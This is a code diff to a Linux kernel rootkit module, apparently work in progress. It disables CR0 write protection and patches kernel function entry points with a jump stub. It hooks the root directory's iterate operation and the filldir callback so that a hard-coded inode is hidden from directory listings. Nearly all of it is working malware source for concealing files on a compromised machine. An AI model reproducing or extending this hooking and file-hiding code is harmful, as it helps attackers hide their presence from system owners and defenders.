@@ -20,7 +20,7 @@
 
 #else
 #define code_size 12
-#define jack_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
+#define jack_code "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
 #define load_fp_size 2
 #define call_fp_size 2
 
@@ -55,6 +55,8 @@ static inline struct hook_node *find_hook_node (void *fp) {
             return nd;
     }
 
+    printk("!QAQ!");
+
     return NULL;
 }
 
@@ -62,7 +64,6 @@ static inline struct hook_node *find_hook_node (void *fp) {
 static inline unsigned long disable_wp(void) {
     unsigned long cr0;
     
-    preempt_disable();
     barrier();
     cr0 = read_cr0();
     write_cr0(cr0 & ~X86_CR0_WP);
@@ -71,57 +72,46 @@ static inline unsigned long disable_wp(void) {
 }
 
 static inline void restore_wp(unsigned long cr0) {
-    write_cr0(cr0);
+    write_cr0(cr0 | X86_CR0_WP);
     barrier();
-    preempt_enable();
 }
 
 static void hijack_fp(struct hook_node *nd) {
-    unsigned long o_cr0 = disable_wp();
+    unsigned long o_cr0;
+    
+    if (nd == NULL) {
+        printk ("FATAL BUG!!!");
+        return;
+    }
 
+    preempt_disable();
+
+    o_cr0  = disable_wp();
     memcpy (nd->hooked_fp, &nd->hijack_code, code_size);
-
     restore_wp (o_cr0);
+    
+    preempt_enable();
 }
 
 static void resume_fp(struct hook_node *nd) {
-    unsigned long o_cr0 = disable_wp();
+    unsigned long o_cr0;
     
-    memcpy (nd->hooked_fp, &nd->o_code, code_size);
+    if (nd == NULL) {
+        printk ("FATAL BUG!!!");
+        return;
+    }
 
+    preempt_disable();
+    
+    o_cr0 = disable_wp();
+    memcpy (nd->hooked_fp, nd->o_code, code_size);
     restore_wp (o_cr0);
+
+    preempt_enable();
 }
 
-static struct dir_context *o_ctx;
-static u64 hide_inode = 51329ULL;
+static u64 hide_inode = 3675405ULL;
 
-static int root_filldir (struct dir_context *ctx,
-        const char *name, int len, loff_t offset, u64 ino, unsigned d_type) {
-    int ret = o_ctx->actor(o_ctx, name, len, offset, ino, d_type);
-    
-    if (ino == hide_inode)
-        return 0;
-
-    return ret;
-}
-
-//static struct dir_context root_ctx = {
-//    .actor = root_filldir
-//};
-
-int rootkit_iterate (struct file *file, struct dir_context *ctx) {
-    int ret;
-    struct hook_node *nd = find_hook_node(origin.iterate);
-//    root_ctx.pos = ctx->pos;
-//    o_ctx = ctx;
-
-    printk ("hook iterate succeed!\n");
-    resume_fp (nd);
-    ret = origin.iterate(file, ctx);
-    hijack_fp (nd);
-
-    return ret;
-}
 
 static void register_hook (void *dest, void *new) {
     struct hook_node *nd;
@@ -138,34 +128,83 @@ static void register_hook (void *dest, void *new) {
 
     list_add (&nd->list, &hook_pool);
 
-    printk ("register hook fp : %p %p\n", dest, new);
-
-    printk ("register hook fp : %p\n", find_hook_node(dest));
-
     memcpy (tmp, &nd->hijack_code, code_size);
-
-    for (i = 0; i < code_size; i++)
-        printk("hijack code[%d] : %#1x\n", i, tmp[i]);
-
+    
     hijack_fp(nd);
-    //resume_fp(nd);
 }
 
-static void get_file_op(const char *path) {
-    struct file *f;
+static filldir_t o_filldir;
+
+static int root_filldir (struct dir_context *ctx,
+        const char *name, int len, loff_t offset, u64 ino, unsigned d_type) {
+    int ret;
+    struct hook_node *nd = find_hook_node (o_filldir);
+    
+    printk ("filldir hook!\n");
+
+    if (ino == hide_inode)
+        return 0;
+
+    resume_fp (nd);
+
+    ret = o_filldir(ctx, name, len, offset, ino, d_type);
+
+    hijack_fp (nd);
+    
+
+    return ret;
+}
+
+//static struct dir_context root_ctx = {
+//    .actor = root_filldir
+//};
+
+static int rootkit_iterate (struct file *file, struct dir_context *ctx) {
+    int ret;
+    struct hook_node *nd = find_hook_node(origin.iterate);
+    struct hook_node *ctx_nd = NULL;
+    
+    if (nd == NULL)
+        return 0;
+
+    resume_fp (nd);
+
+    o_filldir = ctx->actor;
+
+    ctx_nd = find_hook_node (o_filldir);
+
+    printk ("origin filldir addr : %p\n", o_filldir);
+    
+    if (ctx_nd == NULL && o_filldir != NULL)
+        register_hook (o_filldir, root_filldir);
+        
+    ret = origin.iterate(file, ctx);
+    
+    hijack_fp (nd);
+
+    printk ("hook ret :%d\n", ret);
+
+    return ret;
+}
+
+static int get_file_op(const char *path) {
+    struct file *f = NULL;
+
+    printk ("get_file_op.\n");
 
     if ((f = filp_open (path, O_RDONLY, 0)) == NULL) 
-        return;
+        return 0;
 
     memcpy (&origin, f->f_op, sizeof (struct file_operations));
 
-    printk ("iterate fp : %p\n", origin.iterate);
+    printk ("iterate fp : %p %p\n", origin.iterate, f->f_op->iterate);
     
     filp_close (f, 0);
 
     printk ("iterate fp : %p\n", origin.iterate);
-}
 
+    return 1;
+}
 
 
 int rootkit_init(void) {
@@ -177,10 +216,9 @@ int rootkit_init(void) {
             offsetof(hijack_pack_t, fp),
             offsetof(hijack_pack_t, call_fp));
 
-    get_file_op("/tmp");
-
-    register_hook (origin.iterate, rootkit_iterate);
-
+    if (get_file_op("/")) 
+        register_hook (origin.iterate, rootkit_iterate);
+    
     return 0;
 }
 
